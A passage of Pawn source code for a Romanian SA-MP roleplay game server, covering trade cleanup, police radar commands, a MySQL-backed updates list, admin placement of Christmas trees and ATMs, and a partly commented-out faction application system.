			PlayerTextDrawHide(playerid, TradeTD[id_textdraw]),PlayerTextDrawHide(id_invitat, TradeTD[id_textdraw]),id_textdraw++;
			PlayerTextDrawHide(playerid, TradeTD[id_textdraw]),PlayerTextDrawHide(id_invitat, TradeTD[id_textdraw]),id_textdraw++;
			PlayerTextDrawHide(playerid, TradeTD[id_textdraw]),PlayerTextDrawHide(id_invitat, TradeTD[id_textdraw]),id_textdraw++;
			PlayerTextDrawHide(playerid, TradeTD[id_textdraw]),PlayerTextDrawHide(id_invitat, TradeTD[id_textdraw]),id_textdraw++;
			PlayerTextDrawHide(playerid, TradeTD[id_textdraw]),PlayerTextDrawHide(id_invitat, TradeTD[id_textdraw]),id_textdraw++;
			PlayerTextDrawHide(playerid, TradeTD[id_textdraw]),PlayerTextDrawHide(id_invitat, TradeTD[id_textdraw]),id_textdraw++;
			PlayerTextDrawHide(playerid, TradeTD[id_textdraw]),PlayerTextDrawHide(id_invitat, TradeTD[id_textdraw]),id_textdraw++;
			PlayerTextDrawHide(playerid, TradeTD[id_textdraw]),PlayerTextDrawHide(id_invitat, TradeTD[id_textdraw]),id_textdraw++;
			PlayerTextDrawHide(playerid, TradeTD[id_textdraw]),PlayerTextDrawHide(id_invitat, TradeTD[id_textdraw]),id_textdraw++;
			PlayerTextDrawHide(playerid, TradeTD[id_textdraw]),PlayerTextDrawHide(id_invitat, TradeTD[id_textdraw]),id_textdraw++;
			PlayerTextDrawHide(playerid, TradeTD[id_textdraw]),PlayerTextDrawHide(id_invitat, TradeTD[id_textdraw]),id_textdraw++;
			PlayerTextDrawHide(playerid, TradeTD[id_textdraw]),PlayerTextDrawHide(id_invitat, TradeTD[id_textdraw]),id_textdraw++;
			PlayerTextDrawHide(playerid, TradeTD[id_textdraw]),PlayerTextDrawHide(id_invitat, TradeTD[id_textdraw]),id_textdraw++;
			PlayerTextDrawHide(playerid, TradeTD[id_textdraw]),PlayerTextDrawHide(id_invitat, TradeTD[id_textdraw]),id_textdraw++;
			PlayerTextDrawHide(playerid, TradeTD[id_textdraw]),PlayerTextDrawHide(id_invitat, TradeTD[id_textdraw]),id_textdraw++;
			PlayerTextDrawHide(playerid, TradeTD[id_textdraw]),PlayerTextDrawHide(id_invitat, TradeTD[id_textdraw]),id_textdraw++;
			PlayerTextDrawHide(playerid, TradeTD[id_textdraw]),PlayerTextDrawHide(id_invitat, TradeTD[id_textdraw]),id_textdraw++;
			PlayerTextDrawHide(playerid, TradeTD[id_textdraw]),PlayerTextDrawHide(id_invitat, TradeTD[id_textdraw]),id_textdraw++;
			PlayerTextDrawHide(playerid, TradeTD[id_textdraw]),PlayerTextDrawHide(id_invitat, TradeTD[id_textdraw]),id_textdraw++;
			PlayerTextDrawHide(playerid, TradeTD[id_textdraw]),PlayerTextDrawHide(id_invitat, TradeTD[id_textdraw]),id_textdraw++;
			PlayerTextDrawHide(playerid, TradeTD[id_textdraw]),PlayerTextDrawHide(id_invitat, TradeTD[id_textdraw]),id_textdraw++;
			PlayerTextDrawHide(playerid, TradeTD[id_textdraw]),PlayerTextDrawHide(id_invitat, TradeTD[id_textdraw]),id_textdraw++;
			PlayerTextDrawHide(playerid, TradeTD[id_textdraw]),PlayerTextDrawHide(id_invitat, TradeTD[id_textdraw]),id_textdraw++;
			PlayerTextDrawHide(playerid, TradeTD[id_textdraw]),PlayerTextDrawHide(id_invitat, TradeTD[id_textdraw]),id_textdraw++;
			PlayerTextDrawHide(playerid, TradeTD[id_textdraw]),PlayerTextDrawHide(id_invitat, TradeTD[id_textdraw]),id_textdraw++;
			PlayerTextDrawHide(playerid, TradeTD[id_textdraw]),PlayerTextDrawHide(id_invitat, TradeTD[id_textdraw]),id_textdraw++;
			PlayerTextDrawHide(playerid, TradeTD[id_textdraw]),PlayerTextDrawHide(id_invitat, TradeTD[id_textdraw]);
		}
		else
		{
			if(IsPlayerConnected(playerid)) SCM(playerid, COLOR_ERROR, "Business can not start because one of the players is not connected.");
			if(IsPlayerConnected(id_invitat)) SCM(id_invitat, COLOR_ERROR, "Business can not start because one of the players is not connected.");
		}	
	}
	if(status == false)
	{
		if(IsPlayerConnected(playerid)) 
		{ 
			pregatit_trade[playerid] = 0;
			SCM(playerid, COLOR_ERROR, "The business was interrupted.");
			for(new i = 0; i < sizeof(TradeTD); i++) PlayerTextDrawHide(playerid, TradeTD[i]);
			CancelSelectTextDraw(playerid);  in_afacere_cu[playerid] = -1; invitatie_trade[playerid] = -1;  partitie_trade[playerid] = 0; 
			for(new i = 0; i < 15; i++) vehicule[i][playerid] = 0; 
			iteme_adaugate[playerid] = 0;
			afacere_trade[playerid] = 0;
			casa_trade[playerid] = 0;
			suma_bani_trade[playerid] = 0;
		}
		if(IsPlayerConnected(id_invitat)) 
		{ 
			pregatit_trade[id_invitat] = 0;
			SCM(id_invitat, COLOR_ERROR, "The business was interrupted.");
			for(new i = 0; i < sizeof(TradeTD); i++) PlayerTextDrawHide(id_invitat, TradeTD[i]); 
			CancelSelectTextDraw(id_invitat); in_afacere_cu[id_invitat] = -1; invitatie_trade[id_invitat] = -1;  partitie_trade[id_invitat] = 0; 
			for(new i = 0; i < 15; i++) vehicule[i][id_invitat] = 0; 
			iteme_adaugate[id_invitat] = 0; 
			afacere_trade[id_invitat] = 0;
			casa_trade[id_invitat] = 0;
			suma_bani_trade[id_invitat] = 0;
		}
	}
	return 1;
}
//
CMD:startradar(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
		if(!IsACop(playerid)) return SCM(playerid,COLOR_ERROR,"You are not a Cop.");
		if(OnDuty[playerid] != 1) return SendClientMessage(playerid,COLOR_ERROR, "Your Are Not On duty.");
		new tmpcar = GetPlayerVehicleID(playerid);
		new ccar = IsPlayerInAnyVehicle(playerid);
		if(ccar && IsACopCar(tmpcar) || ccar && IsANgCar(tmpcar) || ccar && IsAFbiCar(tmpcar))
		{
			if(Radaron[playerid] == 1) return SCM(playerid,COLOR_ERROR,"The radar is already activated, use the command /stopradar.");
			new viteza,string[128];
			if(sscanf(params, "d",viteza)) return SCM(playerid,COLOR_WHITE,"/startradar <Maximum Speed>");
			if(viteza > 200 || viteza < 40) return SCM(playerid,COLOR_ERROR,"The maximum speed invalid(200-40).");
			Radaron[playerid] = 1;
			Radarlimit[playerid] = viteza;
			TogglePlayerControllable(playerid, 0);
			format(string,sizeof(string),"You have activated radar, the speed is limited: %d KM/H.",viteza);
			SCM(playerid,COLOR_WHITE,string);
			return 1;
		}
		else return SCM(playerid,COLOR_ERROR,"You are not in a police car");
	}
	return 1;
}
CMD:stopradar(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
    {
		if(!IsACop(playerid)) return SCM(playerid,COLOR_ERROR,"You are not a Cop.");
		if(Radaron[playerid] == 0) return SCM(playerid,COLOR_ERROR,"Radar is not activated, use the command /startradar.");
		Radaron[playerid] = 0;
		Radarlimit[playerid] = 0;
		SCM(playerid,COLOR_WHITE,"You stop the radar.");
		TogglePlayerControllable(playerid, 1);
		return 1;
    }
    return 1;
}
/*CMD:play(playerid, params[])
{	
	if(gPlayerLogged[playerid] == 0) return SCM(playerid, COLOR_ERROR, "Nu esti loagat.");
	if(!IsPlayerInRangeOfPoint(playerid,50.0,1977.7538,1017.7076,994.4688)) return SCM(playerid,COLOR_SERVER,"Nu esti in casino.");
	MizaKeno[playerid] = 10000;
	BileSelectate[playerid] = 0;
	SelectTextDraw(playerid, 0xFF0000FF);
	format(MGLOBAL, sizeof(MGLOBAL), "$%s",FormatNumber(GetPlayerCash(playerid)));
	PlayerTextDrawSetString(playerid, KenoTD[102], MGLOBAL);
	PlayerTextDrawSetString(playerid, KenoTD[111], "bile_selectate:_0");
	PlayerTextDrawSetString(playerid, KenoTD[109], "$10,000");
	PlayerTextDrawSetString(playerid, KenoTD[95], " ");
	for(new x = 29; x <= 88; x++) PlayerTextDrawColor(playerid, KenoTD[x], 1113407743);
	for(new i = 0; i < 61; i++) BilaSelectata[playerid][i] = 0;
	for(new i = 0; i < 112; i++) PlayerTextDrawShow(playerid, KenoTD[i]);
	PlayerTextDrawHide(playerid, KenoTD[18]);
	PlayerTextDrawHide(playerid, KenoTD[19]);
	PlayerTextDrawHide(playerid, KenoTD[20]);
	PlayerTextDrawHide(playerid, KenoTD[21]);
	PlayerTextDrawHide(playerid, KenoTD[22]);
	PlayerTextDrawHide(playerid, KenoTD[23]);
	PlayerTextDrawHide(playerid, KenoTD[24]);
	PlayerTextDrawHide(playerid, KenoTD[25]);
	PlayerTextDrawHide(playerid, KenoTD[26]);
	PlayerTextDrawHide(playerid, KenoTD[27]);
	PlayerTextDrawHide(playerid, KenoTD[98]);
	PlayerTextDrawHide(playerid, KenoTD[105]);
	PlayerTextDrawHide(playerid, KenoTD[106]);
	return 1;
}*/
CMD:updates(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SCM(playerid, COLOR_ERROR, "You Are Not Logged In.");
	new query[1000],versiune[128],updateid,vizionari,text[40][1000],rezultat[1000],query2[256],textafisare[2000],data[128], updateid2 = 0;
	mysql_format(SQL, query, sizeof(query), "SELECT * FROM `updates` WHERE `ID` > '0'");
	new Cache: cache = mysql_query(SQL, query);
	if(cache_get_row_count() < 1) return SCM(playerid, COLOR_ERROR, "There are no updateuri added to the pick list.");
	for(new i, j = cache_get_row_count(); i != j; i++)
	{
		updateid = cache_get_field_content_int(i, "ID");
		vizionari = cache_get_field_content_int(i, "Vizionari");
		cache_get_field_content(i, "Versiune", rezultat); format(versiune, 128, rezultat);
		cache_get_field_content(i, "Data", rezultat); format(data, 128, rezultat);
		for(new a = 0; a < 40; a++)
		{
			format(query2, sizeof(query2), "Text%d",a);
			cache_get_field_content(i, query2,rezultat); format(text[a], 1000, rezultat);
			strcpy(updatetext[a][updateid2], text[a], 1000);
		}
		strcpy(updatedata[updateid2], data, 128);
		strcpy(updateversiune[updateid2], versiune, 128);
		updateid2++;
		if(updateid == 1) format(textafisare, sizeof(textafisare), "{0066FF}ID\t{FFFFFF}Version\t{0066FF}Data\t{FFFFFF}Version\n{FFFFFF}Update {0066FF}# %d\t{FFFFFF}%s\t{0066FF}%s{FFFFFF}\t%d",updateid, versiune,data, vizionari);
		if(updateid > 1) format(textafisare, sizeof(textafisare), "%s\n{FFFFFF}Update {0066FF}# %d\t{FFFFFF}%s\t{0066FF}%s{FFFFFF}\t%d",textafisare,updateid,versiune,data, vizionari);
	}
	ShowPlayerDialog(playerid, DIALOG_UPDATES, DIALOG_STYLE_TABLIST_HEADERS, "SERVER: Updates", textafisare, "Seleteaza","CANCEL");
	cache_delete(cache);
	return 1;
}
CMD:au(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SCM(playerid, COLOR_ERROR, "You Are Not Logged In.");
	if(PlayerInfo[playerid][pAdmin] >= 7)
	{
		new versiune[128],data[128],query[1000];
		if(sscanf(params, "s[128]", versiune)) return SCM(playerid, -1, "USAGE: /addupdate [Name Version]");
		new year, month,day;
	    getdate(year, month, day);
		format(data, sizeof(data), "%02d.%02d.%d",day,month,year);
		mysql_format(SQL, query, sizeof(query), "INSERT INTO `updates` (`Versiune`,`Data`) VALUES ('%s','%s')",versiune,data);
		mysql_tquery(SQL, query, "", "");
		SCM(playerid, -1, "{0066FF}UPDATE: {FFFFFF}The version was added successfully.");
	}
	return 1;
}
CMD:aul(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SCM(playerid, COLOR_ERROR, "You Are Not Logged In.");
	if(PlayerInfo[playerid][pAdmin] >= 7)
	{
		new versiune[512],query[1000],linie,id;
		if(sscanf(params, "iis[128]", linie,id,versiune)) return SCM(playerid, -1, "USAGE: /addupdateline [line (0-40)] [id] [Description]");
		mysql_format(SQL, query, sizeof(query), "UPDATE `updates` SET `Text%d`='%s' WHERE `ID`='%d'",linie,versiune,id);
		mysql_tquery(SQL, query, "", "");
		SCM(playerid, -1, "{0066FF}UPDATE: {FFFFFF}The line was added successfully.");
	}
	return 1;
}
CMD:resetdeschouse(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 7)
	{
		new query[1000];
		mysql_format(SQL, query, sizeof(query), "UPDATE `houses` SET `Owner`='Magic-Gaming.tk' WHERE `Owned`='0'");
		mysql_tquery(SQL, query, "", "");
	}
	return 1;
}
// CRACIUN /CREEAZABRAD
/*
public IncarcaBrazi()
{
	new rezultat[256],id;
	new Cache: brazi = mysql_query(SQL, "SELECT * FROM `brazi` ORDER BY `ID`");
	for(new i, j = cache_get_row_count(); i != j; i ++)
	{
		Brad[i][ID] = cache_get_field_content_int(i, "ID");
		id = Brad[i][ID];
		cache_get_field_content(i, "X", rezultat); Brad[id][PozitieBrad][0] = floatstr(rezultat);
		cache_get_field_content(i, "Y", rezultat); Brad[id][PozitieBrad][1] = floatstr(rezultat);
		cache_get_field_content(i, "Z", rezultat); Brad[id][PozitieBrad][2] = floatstr(rezultat);
		cache_get_field_content(i, "Rotatie", rezultat); Brad[id][PozitieBrad][3] = floatstr(rezultat);
		if(id > 0)
		{
  			ObjectBrad[id] = CreateDynamicObject(19076, Brad[id][PozitieBrad][0],Brad[id][PozitieBrad][1],Brad[id][PozitieBrad][2],0.00000, 0.00000, Brad[id][PozitieBrad][3]);
		}
		ultimulbrad = id;
	}
	printf("Ultimul Brad incarcat: %d", ultimulbrad);
	cache_delete(brazi);
	return 1;
}
public IncarcaOmZapada()
{
	new rezultat[256],id,id3 = 0;
	ultimulomdezapada = 0;
	new Cache: oamenidezapada = mysql_query(SQL, "SELECT * FROM `oameni_de_zapada` ORDER BY `ID`");
	for(new i, j = cache_get_row_count(); i != j; i ++)
	{
		OMZapada[i][ID] = cache_get_field_content_int(i, "ID");
		id = OMZapada[i][ID];
		if(id > 0)
		{
			cache_get_field_content(i, "X", rezultat); OMZapada[id3][PozitieOMZapada][0] = floatstr(rezultat);
			cache_get_field_content(i, "Y", rezultat); OMZapada[id3][PozitieOMZapada][1] = floatstr(rezultat);
			cache_get_field_content(i, "Z", rezultat); OMZapada[id3][PozitieOMZapada][2] = floatstr(rezultat);
			ultimulomdezapada = id;
			id3++;
		}
	}
	foreach(Player, playerid)
	{
		if(IsPlayerConnected(playerid))
		{
			if(gPlayerLogged[playerid] > 0)
			{
				new remain = ultimulomdezapada;
				for(new qs=0; qs<=50; qs++)
				{
					if(QEvent[playerid][qs] == 1)
					{
						remain--;
					}
				}
				if(remain > 0)
				{
					for(new idd = 0; idd < sizeof(OMZapada); idd++)
					{
						for(new id2 = 0; id2 < 9; id2++)
						{
							if(IsValidDynamicObject(Omdezapada[playerid][idd][id2]))
							{
								DestroyDynamicObject(Omdezapada[playerid][idd][id2]);
							}
						}	
						if(QEvent[playerid][idd] == 0)
						{	
							Omdezapada[playerid][idd][0] = CreateDynamicObject(1305, OMZapada[idd][PozitieOMZapada][0], OMZapada[idd][PozitieOMZapada][1], OMZapada[idd][PozitieOMZapada][2]-0.6,  0.00000, 0.00000, 0.00000,-1, -1, playerid, 200.0);
							Omdezapada[playerid][idd][1] = CreateDynamicObject(1305, OMZapada[idd][PozitieOMZapada][0], OMZapada[idd][PozitieOMZapada][1], OMZapada[idd][PozitieOMZapada][2]+1.3,   0.00000, 0.00000, 0.00000,-1, -1, playerid, 200.0);
							Omdezapada[playerid][idd][2] = CreateDynamicObject(1304, OMZapada[idd][PozitieOMZapada][0], OMZapada[idd][PozitieOMZapada][1], OMZapada[idd][PozitieOMZapada][2]+3.5,   0.00000, 0.00000, 0.00000,-1, -1, playerid, 200.0);
							SetDynamicObjectMaterial(Omdezapada[playerid][idd][0], 0, 3914, "snow", "mp_snow", 0xFFFFFFFF);
							SetDynamicObjectMaterial(Omdezapada[playerid][idd][1], 0, 3914, "snow", "mp_snow", 0xFFFFFFFF);
							SetDynamicObjectMaterial(Omdezapada[playerid][idd][2], 0, 3914, "snow", "mp_snow", 0xFFFFFFFF);
							Omdezapada[playerid][idd][3] = CreateDynamicObject(19087, OMZapada[idd][PozitieOMZapada][0]-0.5, OMZapada[idd][PozitieOMZapada][1], OMZapada[idd][PozitieOMZapada][2]+3.0,   0.00000, 40.00000, 0.00000,-1, -1, playerid, 200.0);
							Omdezapada[playerid][idd][4] = CreateDynamicObject(19087, OMZapada[idd][PozitieOMZapada][0]+1.9, OMZapada[idd][PozitieOMZapada][1], OMZapada[idd][PozitieOMZapada][2]+3.0,   0.00000, -40.00000, 180.00000,-1, -1, playerid, 200.0);
							Omdezapada[playerid][idd][5] = CreateDynamicObject(1922, OMZapada[idd][PozitieOMZapada][0]+0.1, OMZapada[idd][PozitieOMZapada][1]+0.75, OMZapada[idd][PozitieOMZapada][2]+3.37,   0.00000, 90.00000, 90.00000,-1, -1, playerid, 200.0);
							Omdezapada[playerid][idd][6] = CreateDynamicObject(1922, OMZapada[idd][PozitieOMZapada][0]-0.4, OMZapada[idd][PozitieOMZapada][1]+0.75, OMZapada[idd][PozitieOMZapada][2]+3.37,   0.00000, 90.00000, 90.00000,-1, -1, playerid, 200.0);
							Omdezapada[playerid][idd][7] = CreateDynamicObject(1921, OMZapada[idd][PozitieOMZapada][0]-0.2, OMZapada[idd][PozitieOMZapada][1]+0.7, OMZapada[idd][PozitieOMZapada][2]+3.2,   0.00000, 90.00000, 90.00000,-1, -1, playerid, 200.0);
							Omdezapada[playerid][idd][8] = CreateDynamicObject(19065, OMZapada[idd][PozitieOMZapada][0]-0.8, OMZapada[idd][PozitieOMZapada][1]+0.5, OMZapada[idd][PozitieOMZapada][2]+3.8,   0.00000, 0.00000, 0.00000,-1, -1, playerid, 200.0);
							SetDynamicObjectMaterial(Omdezapada[playerid][idd][3], 0, 2361, "shopping_freezers", "white", 0xFF000000);
							SetDynamicObjectMaterial(Omdezapada[playerid][idd][4], 0, 2361, "shopping_freezers", "white", 0xFF000000);
							SetDynamicObjectMaterial(Omdezapada[playerid][idd][5], 0, 2361, "shopping_freezers", "white", 0xFF000000);
							SetDynamicObjectMaterial(Omdezapada[playerid][idd][6], 0, 2361, "shopping_freezers", "white", 0xFF000000);
							SetDynamicObjectMaterial(Omdezapada[playerid][idd][7], 0, 2361, "shopping_freezers", "white", 0xFF000000);
						}
					}	
				}	
			}
		}
	}
	printf("Ultimul om de zapada incarcat: %d", ultimulomdezapada);
	cache_delete(oamenidezapada);
	return 1;
}*/
CMD:creeazabrad(playerid, params[])
{
    if(gPlayerLogged[playerid] < 1) return SCM(playerid, COLOR_ERROR, "You Are Not Logged In.");
	if(PlayerInfo[playerid][pAdmin] >= 7)
	{
	    ultimulbrad+=1;
	    new id = ultimulbrad;
	    new mysqlinsert[1500];
	    GetPlayerPos(playerid, Brad[id][PozitieBrad][0],Brad[id][PozitieBrad][1],Brad[id][PozitieBrad][2]);
		Brad[id][PozitieBrad][2] -= 1.30;
	    GetPlayerFacingAngle(playerid, Brad[id][PozitieBrad][3]);
	    mysql_format(SQL, mysqlinsert, sizeof(mysqlinsert), "INSERT INTO brazi (`ID`,`X`,`Y`,`Z`,`Rotatie`) VALUES ('%d','%f','%f','%f','%f')",ultimulbrad,Brad[id][PozitieBrad][0],Brad[id][PozitieBrad][1],Brad[id][PozitieBrad][2],Brad[id][PozitieBrad][3]);
		mysql_tquery(SQL, mysqlinsert, "", "");
		incarcabradtimer = 3;
	}
	return 1;
}
//COMENZI & STOCK-URI & PUBLIC-URI PENTRU SISTEMUL DE ATM
CMD:creeazaatm(playerid, params[])
{
    if(gPlayerLogged[playerid] < 1) return SCM(playerid, COLOR_ERROR, "You Are Not Logged In.");
	if(PlayerInfo[playerid][pAdmin] >= 7)
	{
	    ultimulatm+=1;
	    new id = ultimulatm;
	    new mysqlinsert[1500];
	    GetPlayerPos(playerid, ATM[id][PozitieATM][0],ATM[id][PozitieATM][1],ATM[id][PozitieATM][2]);
	    GetPlayerFacingAngle(playerid, ATM[id][PozitieATM][3]);
	    mysql_format(SQL, mysqlinsert, sizeof(mysqlinsert), "INSERT INTO atmuri (`ID`,`X`,`Y`,`Z`,`Rotatie`) VALUES ('%d','%f','%f','%f','%f')",ultimulatm,ATM[id][PozitieATM][0],ATM[id][PozitieATM][1],ATM[id][PozitieATM][2],ATM[id][PozitieATM][3]);
		mysql_tquery(SQL, mysqlinsert, "", "");
		incarcaatmtimer = 3;
	}
	return 1;
}
public incarcaATM()
{
	new rezultat[256],id;
	new Cache: atmuri = mysql_query(SQL, "SELECT * FROM `atmuri` ORDER BY `ID`");
	for(new i, j = cache_get_row_count(); i != j; i ++)
	{
		ATM[i][ID] = cache_get_field_content_int(i, "ID");
		id = ATM[i][ID];
		cache_get_field_content(i, "X", rezultat); ATM[id][PozitieATM][0] = floatstr(rezultat);
		cache_get_field_content(i, "Y", rezultat); ATM[id][PozitieATM][1] = floatstr(rezultat);
		cache_get_field_content(i, "Z", rezultat); ATM[id][PozitieATM][2] = floatstr(rezultat);
		cache_get_field_content(i, "Rotatie", rezultat); ATM[id][PozitieATM][3] = floatstr(rezultat);
		if(id > 0)
		{
			TabeleATM[id] = Create3DTextLabel("{0066FF}ATM\n{FFFFFF}Use the command [{0066FF}/atm{FFFFFF}]",0x0066FFCC,ATM[id][PozitieATM][0],ATM[id][PozitieATM][1],ATM[id][PozitieATM][2],8.0,0);
  			ObjectATM[id] = CreateDynamicObject(19324, ATM[id][PozitieATM][0],ATM[id][PozitieATM][1],ATM[id][PozitieATM][2]-0.20,0.00000, 0.00000, ATM[id][PozitieATM][3]);
		}
		ultimulatm = id;
	}
	printf("Ultimul ATM incarcat: %d", ultimulatm);
	cache_delete(atmuri);
	return 1;
}
CMD:atm(playerid, params[])
{
	if(gPlayerLogged[playerid] < 1) return SCM(playerid, COLOR_ERROR, "You Are Not Logged In.");
	for(new id; id < sizeof(ATM); id++)
	{
	    if(IsPlayerInRangeOfPoint(playerid, 3.0, ATM[id][PozitieATM][0],ATM[id][PozitieATM][1],ATM[id][PozitieATM][2]))
	    {
			PornesteATM(playerid);
			SelectTextDraw(playerid, COLOR_SERVER);
			PlayerTextDrawSetString(playerid, ATMTD[playerid][10], "ATM ~r~T-Zone");
		}
	}
	return 1;
}
stock PornesteATM(playerid)
{
	PlayerTextDrawShow(playerid, ATMTD[playerid][0]);
	PlayerTextDrawShow(playerid, ATMTD[playerid][1]);
	PlayerTextDrawShow(playerid, ATMTD[playerid][2]);
	PlayerTextDrawShow(playerid, ATMTD[playerid][3]);
	PlayerTextDrawShow(playerid, ATMTD[playerid][4]);
	PlayerTextDrawShow(playerid, ATMTD[playerid][5]);
	PlayerTextDrawShow(playerid, ATMTD[playerid][6]);
	PlayerTextDrawShow(playerid, ATMTD[playerid][7]);
	PlayerTextDrawShow(playerid, ATMTD[playerid][8]);
	PlayerTextDrawShow(playerid, ATMTD[playerid][9]);
	PlayerTextDrawShow(playerid, ATMTD[playerid][10]);
	PlayerTextDrawShow(playerid, ATMTD[playerid][11]);
	esteinATM[playerid] = 1;
	return 1;
}
stock OpresteATM(playerid)
{
    PlayerTextDrawHide(playerid, ATMTD[playerid][0]);
	PlayerTextDrawHide(playerid, ATMTD[playerid][1]);
	PlayerTextDrawHide(playerid, ATMTD[playerid][2]);
	PlayerTextDrawHide(playerid, ATMTD[playerid][3]);
	PlayerTextDrawHide(playerid, ATMTD[playerid][4]);
	PlayerTextDrawHide(playerid, ATMTD[playerid][5]);
	PlayerTextDrawHide(playerid, ATMTD[playerid][6]);
	PlayerTextDrawHide(playerid, ATMTD[playerid][7]);
	PlayerTextDrawHide(playerid, ATMTD[playerid][8]);
	PlayerTextDrawHide(playerid, ATMTD[playerid][9]);
	PlayerTextDrawHide(playerid, ATMTD[playerid][10]);
	PlayerTextDrawHide(playerid, ATMTD[playerid][11]);
	esteinATM[playerid] = -1;
	atminterogare[playerid] = -1;
	atmretragere[playerid] = -1;
	accestransfer[playerid] = -1;
	return 1;
}
//COMENZI PENTRU APLICATII DIN JOC.
/*CMD:viewapps(playerid, params[])
{
	new checkmysql[1200],idaplicant,stringapps[1000],doarodata = 0,levelaplicant,numeaplicant[60],oreaplicant,result[500],idlistitem = 0;
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	new Cache: verificare3;
	if(PlayerInfo[playerid][pLeader] < 1) return SCM(playerid, COLOR_ERROR, "Nu esti lider la o factiune");
	mysql_format(SQL, checkmysql, sizeof(checkmysql), "SELECT * FROM `aplications` WHERE `factionid`='%d'",PlayerInfo[playerid][pLeader]);
	new Cache: verificare = mysql_query(SQL, checkmysql);
	if(cache_get_row_count() > 0)
	{
		for(new i, c = cache_get_row_count(); i != c; i++)
		{
	        idaplicant = cache_get_field_content_int(i, "playerid");
       		mysql_format(SQL, checkmysql, sizeof(checkmysql), "SELECT * FROM `users` WHERE `id`='%d'",idaplicant);
			new Cache: verificare2 = mysql_query(SQL, checkmysql);
			for(new x, ca = cache_get_row_count(); x != ca; x++)
			{
		  	  	cache_get_field_content(x, "name", result); format(numeaplicant, 30, result);
				levelaplicant = cache_get_field_content_int(x, "Level");
				oreaplicant = cache_get_field_content_int(x, "ConnectedTime");
				Selected[playerid][idlistitem] = idaplicant;
				idlistitem += 1;
				cache_delete(verificare2);
				if(doarodata == 0)
				{
		  			format(stringapps, sizeof(stringapps), "Nume\tLevel\tOre jucate\n");
					doarodata = 1;
				}
    			format(stringapps, sizeof(stringapps), "%s%s\t%d\t%d\n",stringapps,numeaplicant,levelaplicant,oreaplicant);
			}
			mysql_format(SQL, checkmysql, sizeof(checkmysql), "SELECT * FROM `aplications` WHERE `factionid`='%d'",PlayerInfo[playerid][pLeader]);
			verificare3 = mysql_query(SQL, checkmysql);
			
		}
		ShowPlayerDialog(playerid, DIALOG_APLICATII, DIALOG_STYLE_TABLIST_HEADERS, "Aplicatile jucatorilor...", stringapps , "Selecteaza", "CANCEL");
	}
	else
	{
	    SCM(playerid, COLOR_ERROR, "Nu exista aplicatii");
	}
	cache_delete(verificare3);
	cache_delete(verificare);
	return 1;
}
CMD:fapply(playerid, params[])
{
	new stringz2[MAX_STRING],checkmysql[512];
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pMember] > 0 || PlayerInfo[playerid][pLeader] > 0) return SCM(playerid, COLOR_ERROR, "Nu poti accesa aceasta comanda deoarece faci parte dintr-o factiune");
	mysql_format(SQL, checkmysql, sizeof(checkmysql), "SELECT * FROM `users` WHERE `id`='%d' and `aplicatie`='0'",PlayerInfo[playerid][pSQLID]);
	new Cache: verificare = mysql_query(SQL, checkmysql);
	if(cache_get_row_count() < 1) return ShowPlayerDialog(playerid, DIALOG_AIAPLICATIE, DIALOG_STYLE_MSGBOX, "Server: Aplicatie", "Ai deja o aplicatie la o factiune, pentru a putea continua este nevoie sa o stergi.", "Sterge", "CANCEL");
	cache_delete(verificare);
	if(DynamicFactions[1][fApplication] > 0)
  	{
		format(stringz2, sizeof(stringz2),"{FFFFFF}%s\t[%d/%d] \t{00FF00}[deschise]\n", DynamicFactions[1][fName],GetFactionMembers(1), DynamicFactions[1][fMaxMembers]);
	}
	else
	{
 		format(stringz2, sizeof(stringz2),"{FFFFFF}%s\t[%d/%d] \t{ff0000}[inchise]\n", DynamicFactions[1][fName],GetFactionMembers(1), DynamicFactions[1][fMaxMembers]);
	}
 	if(DynamicFactions[2][fApplication] > 0)
  	{
		format(stringz2, sizeof(stringz2),"%s{FFFFFF}%s\t[%d/%d] \t{00FF00}[deschise]\n", stringz2, DynamicFactions[2][fName],GetFactionMembers(2), DynamicFactions[2][fMaxMembers]);
	}
	else
	{
 		format(stringz2, sizeof(stringz2),"%s{FFFFFF}%s\t[%d/%d] \t{ff0000}[inchise]\n", stringz2, DynamicFactions[2][fName],GetFactionMembers(2), DynamicFactions[2][fMaxMembers]);
	}
	if(DynamicFactions[3][fApplication] > 0)
	{
		format(stringz2, sizeof(stringz2),"%s{FFFFFF}%s\t[%d/%d] \t{00FF00}[deschise]\n", stringz2, DynamicFactions[3][fName],GetFactionMembers(3), DynamicFactions[3][fMaxMembers]);
	}
	else
	{
 		format(stringz2, sizeof(stringz2),"%s{FFFFFF}%s\t[%d/%d] \t{ff0000}[inchise]\n", stringz2, DynamicFactions[3][fName],GetFactionMembers(3), DynamicFactions[3][fMaxMembers]);
	}
 	if(DynamicFactions[4][fApplication] > 0)
  	{
		format(stringz2, sizeof(stringz2),"%s{FFFFFF}%s\t[%d/%d] \t{00FF00}[deschise]\n", stringz2, DynamicFactions[4][fName],GetFactionMembers(4), DynamicFactions[4][fMaxMembers]);
	}
	else
	{
 		format(stringz2, sizeof(stringz2),"%s{FFFFFF}%s\t[%d/%d] \t{ff0000}[inchise]\n", stringz2, DynamicFactions[4][fName],GetFactionMembers(4), DynamicFactions[4][fMaxMembers]);
	}
 	if(DynamicFactions[5][fApplication] > 0)
  	{
		format(stringz2, sizeof(stringz2),"%s{FFFFFF}%s\t[%d/%d] \t{00FF00}[deschise]\n", stringz2, DynamicFactions[5][fName],GetFactionMembers(5), DynamicFactions[5][fMaxMembers]);
	}
	else
	{
		format(stringz2, sizeof(stringz2),"%s{FFFFFF}%s\t[%d/%d] \t{ff0000}[inchise]\n", stringz2, DynamicFactions[5][fName],GetFactionMembers(5), DynamicFactions[5][fMaxMembers]);
	}
 	if(DynamicFactions[6][fApplication] > 0)
  	{
		format(stringz2, sizeof(stringz2),"%s{FFFFFF}%s\t[%d/%d] \t{00FF00}[deschise]\n", stringz2, DynamicFactions[6][fName],GetFactionMembers(6), DynamicFactions[6][fMaxMembers]);
